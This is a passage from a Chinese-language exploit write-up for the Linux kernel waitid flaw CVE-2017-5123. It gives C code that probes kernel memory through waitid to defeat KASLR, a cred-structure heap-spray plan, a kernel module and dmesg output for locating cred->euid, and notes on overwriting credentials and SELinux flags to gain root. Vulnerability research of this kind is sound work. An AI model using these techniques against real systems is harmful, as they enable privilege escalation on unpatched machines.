        struct group_info *group_info;    /* supplementary groups for euid/fsgid */
        struct rcu_head    rcu;        /* RCU deletion hook */
    };
在如何找到该结构这一点上，我们是完全盲目的。因此，我们需要一种方法来绕过内核地址空间布局随机化（KASLR），并找到内核堆。
**通过内存探测绕过KASLR**
****
通过使用诸如 **copy_from_user()** 、 **copy_to_user()** 等函数，我们可以确保当缺页（Page
Fault）异常处理程序指定了错误的地址时，不会发生内核的OOPS。
这样的做法是有用的，因为当他们提供的地址不属于用户空间中的进程所在的地址空间时，非特权用户并不能引起一次DoS。
使用 **unsafe_put_user()** 时也会发生同样的情况，这就意味着，我们可以在内存堆可能位于的区间内，进行内存探测。
我是通过下述代码来实现的：
    for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
        pid = fork();
        if (pid > 0) 
        {
            if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0) 
            {
                printf("[+] Found %pn", i);
                break;
            }
        }
        else if (pid == 0)
            exit(0);
    }
这里的关键之处在于： **当我们尝试一个有效地址时，waited()不会返回EFAULT。** 所以，我们可以用这种方式进行内存探测。
既然现在我们已经知道了内存堆的位置，接下来要做的，就是要弄明白cred结构是如何生存的，因为内核堆的状态还是未知。
**堆喷射**
至此，我已经有了一个清晰的思路，具体如下：
**如果我们创建了成百上千个进程，那么内核堆中也会随之创建成百上千个cred结构。**
**因此，我的思路是创建大量的进程，并通过不断调用geteuid()，在循环中检查其是否得到了为0的euid。**
**一旦geteuid()返回值为0，那么我们就大功告成，可以从那里写入到cred- >euid – 0x10，也就是cred->uid。**
通过堆喷射，我们可以不断增加命中目标的概率，尽管它并不能保证百分之百有效。这一部分，Chris也提出了相似的堆喷射思路。但对比两种方法，堆喷射显然更有助于我们的漏洞利用过程。
当产生了很多个cred结构后，我们观察其位置，发现在有些地址，cred会一直保留，即使是在重启之后。
如果你也想观察它们的位置，可以在不需要内核调试的地方进行观察，只需要使用这个内核模块，打印出cred->euid生存的位置。
    #include 
    #include 
    #include 
    #include 
    #include         // for basic filesystem
    #include     // for the proc filesystem
    #include     // for sequence files
    static struct proc_dir_entry* jif_file;
    static int
    jif_show(struct seq_file *m, void *v)
    {
        return 0;
    }
    static int
    jif_open(struct inode *inode, struct file *file)
    {
         printk("EUID: %pn", &current->cred->euid);
         return single_open(file, jif_show, NULL);
    }
    static const struct file_operations jif_fops = {
        .owner    = THIS_MODULE,
        .open    = jif_open,
        .read    = seq_read,
        .llseek    = seq_lseek,
        .release    = single_release,
    };
    static int __init
    jif_init(void)
    {
        jif_file = proc_create("jif", 0, NULL, &jif_fops);
        if (!jif_file) {
            return -ENOMEM;
        }
        return 0;
    }
    static void __exit
    jif_exit(void)
    {
        remove_proc_entry("jif", NULL);
    }
    module_init(jif_init);
    module_exit(jif_exit);
    MODULE_LICENSE("GPL");
通过fork和反复打开/proc/jif，我们可以在之后使用dmesg来查看printk()的输出。
    # dmesg | grep EUID:
    [16485.192353] EUID: ffff88015e909a14
    [16485.192415] EUID: ffff88015e9097d4
    [16485.192475] EUID: ffff88015e909954
    [16485.192537] EUID: ffff880126c627d4
    [16485.192599] EUID: ffff88015e9094d4
    [16485.192660] EUID: ffff88015e909414
    [16485.192725] EUID: ffff88015e909294
    [16485.192790] EUID: ffff88015e909054
    [16485.192860] EUID: ffff8801358efdd4
    [16485.192925] EUID: ffff8801358efd14
    [16485.192991] EUID: ffff8801358efe94
    [16485.193057] EUID: ffff88015e909354
    [16485.193124] EUID: ffff88015e9091d4
    [16485.193187] EUID: ffff8801358eff54
    [16485.193249] EUID: ffff8801358efb94
    [16485.193314] EUID: ffff8801358efa14
    [16485.193381] EUID: ffff88015e909114
    [16485.193449] EUID: ffff8801358ef894
    [16485.193515] EUID: ffff8801358ef714
    [16485.234054] EUID: ffff880125766d14
    [16485.234150] EUID: ffff8801256e9954
    [16485.234189] EUID: ffff8801256e9654
    [16485.429875] EUID: ffff8801257661d4
    [16485.429881] EUID: ffff8801256e9e94
    [16485.603481] EUID: ffff8801358ef954
    [16485.603543] EUID: ffff8801256e9b94
    [16485.603582] EUID: ffff880126c62e94
    [16485.603620] EUID: ffff8801358ef7d4
    [16485.603658] EUID: ffff880126c62a14
    [16485.603701] EUID: ffff880125766654
    [16485.603743] EUID: ffff8801358ef654
    [16485.603782] EUID: ffff8801257667d4
    [16485.603824] EUID: ffff880125766a14
    [16485.603864] EUID: ffff880125766b94
    [16485.603906] EUID: ffff8801256e94d4
    [16485.603943] EUID: ffff8801256e91d4
    [16485.603979] EUID: ffff880126c62d14
    [16485.604017] EUID: ffff88015e909654
    [...]
这样，我们就可以猜测其所在位置，并进行尝试。
至此，我们就知道了在“堆基址+一定的偏移量”的位置，命中目标的概率会比其他地方要高出很多。
所以，我们可以开始写入这些位置，然后增加PAGESIZE，借此希望能够改写其中某一个进程的凭据。如果能成功改写，我们也就成功实现了对该漏洞的利用。
特别一提的是，我之前还写过另外一篇文章，是通过覆盖 **selinux_enforcing** 和 **selinux_enabled**
来实现对SELinux的禁用，有兴趣的读者可以阅读：
**漏洞利用**
****
如果你已经仔细阅读了上面的全部内容，我相信你现在一定可以尝试着利用这个漏洞，并没有想象的那么复杂。
如大家所见，我更有针对性地讲解了如何去利用这种原始的技术实现漏洞利用，而不仅仅针对这个CVE-2017-5123提供指导。当然了，我们这次是一箭双雕。
**结论**
****
通过对该漏洞的分析，我们意识到，这种类型的漏洞确实具有很大的威胁性。除此之外，我们也应该思考并尝试着用不同的方法实现Linux内核漏洞的利用。
最后，感谢André Baptista
[@0xACB](https://twitter.com/0xACB)以及所有xSTF。重点要感谢[@osxreverser](https://twitter.com/osxreverser)让我在这里发布自己的Write-up。